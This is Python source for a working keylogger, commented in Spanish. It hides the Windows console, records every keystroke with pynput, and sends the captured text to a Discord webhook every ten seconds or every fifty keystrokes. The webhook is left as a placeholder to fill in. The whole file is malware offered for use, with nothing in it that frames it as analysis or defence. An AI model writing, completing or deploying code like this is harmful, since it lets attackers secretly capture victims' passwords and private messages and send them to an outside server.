import pynput.keyboard
import requests
import threading
import ctypes
import os

# --- CONFIGURACIÓN ---
WEBHOOK_URL = "TU_URL_DE_DISCORD_AQUI"
LIMITE_CARACTERES = 50 # Envía el log cada 50 pulsaciones

class Keylogger:
    def __init__(self):
        self.log = ""
        self.ocultar_consola()

    def ocultar_consola(self):
        if os.name == 'nt':
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def reportar(self):
        """Envía el log a Discord y lo limpia"""
        if self.log:
            try:
                requests.post(WEBHOOK_URL, json={"content": self.log})
                self.log = ""
            except:
                pass # Si no hay internet, no hace nada
        
        # Temporizador para revisar cada X segundos
        timer = threading.Timer(10, self.reportar)
        timer.start()

    def al_pulsar(self, tecla):
        try:
            current_key = str(tecla.char)
        except AttributeError:
            if tecla == tecla.space:
                current_key = " "
            else:
                current_key = " [" + str(tecla) + "] "
        
        self.log += current_key
        if len(self.log) >= LIMITE_CARACTERES:
            self.reportar()

    def iniciar(self):
        escuchador = pynput.keyboard.Listener(on_press=self.al_pulsar)
        with escuchador:
            self.reportar() # Inicia el ciclo de envío
            escuchador.join()

if __name__ == "__main__":
    malware = Keylogger()
    malware.iniciar()
